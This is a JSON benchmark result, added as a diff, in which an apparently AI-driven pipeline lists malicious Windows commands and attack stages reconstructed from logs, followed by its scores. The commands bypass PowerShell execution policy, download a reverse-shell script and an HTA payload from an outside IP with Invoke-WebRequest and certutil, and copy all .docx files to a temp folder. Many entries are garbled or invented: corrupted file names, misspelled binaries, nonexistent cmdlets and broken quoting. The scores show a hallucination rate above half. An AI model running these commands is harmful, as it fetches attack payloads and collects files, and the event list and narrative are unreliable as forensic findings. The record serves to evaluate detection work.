@@ -1,0 +1,104 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powersell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1134.001 -TestNumbers 1\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"invoke-webrequest http://124.223.85.207:8082/Invoke-PowerShellTcpOneLine -method post -UseBasicParsing\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-Webrequest http://124.223.85.207:8084/test.html -Method Post -UseBasicParsing -ContentType application/json\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebService -URI http://124.223.85.207:8082/service.asmx -Method POST -Body @{'password':'123'}-UseBasicParsing\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-Rmi -Uri http://192.168.1.1:8080/rmi",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"$byteStream=([IO.MemoryStream][Convert]::FromBase64String('BASE64STRING'));$byteStream.Write($byteArray,$offsetLength)\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"New-Object IO.StreamWriter('\\\\PIPE\\MYPIPE',true)\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"$webResponse=[Net.WebClient]::DownloadString(\u2018http://1.1.1.1/api/v1/data\u2019),$myVariable=$webResponse.DownloadString(\u201chttps://www.example.com\u201d)-eq \u2018success\u2019)\u201d, ",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"cscript C:\\AtomicRedTeam\\atomics\\T1059.005\\src\\sys_info.vbs\",\"stage\": ",
+        "stage": "Collection"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"cmd /c mkdir %temp%/T1119_command_prompt_collection >nul 2>&1 & dir c: /b /s .docx | findstr /e .docx & for /R c: %f in (*.docx) do copy %f %temp%/T1119_command_prompt_collection\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Get-Service > $env:TEMP\\\\",
+        "stage": "Collection"
+      }
+    ],
+    "narrative": "The attack began when an unknown actor remotely accessed the target host through multiple services exploiting various vulnerabilities, such as those related to Adobe Acrobat Reader, Java, Apache Struts, and Internet Explorer. The attacker used PowerShell scripts to execute commands, collect data, and establish persistence on the system.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 235078,
+      "completion_tokens": 3931,
+      "total_tokens": 239009,
+      "wall_clock_s": 69.467,
+      "parse_retries": 2
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.06666666666666667,
+      "recall": 0.02702702702702703,
+      "f1": 0.038461538461538464,
+      "tp": 1,
+      "fp": 14,
+      "fn": 36
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 15,
+      "fn": 37,
+      "recall_partial": 0.013513513513513514
+    },
+    "hallucination_rate": 0.5384615384615384,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 235078,
+      "completion_tokens": 3931,
+      "total_tokens": 239009,
+      "wall_clock_s": 69.467,
+      "parse_retries": 2
+    }
+  }
+}
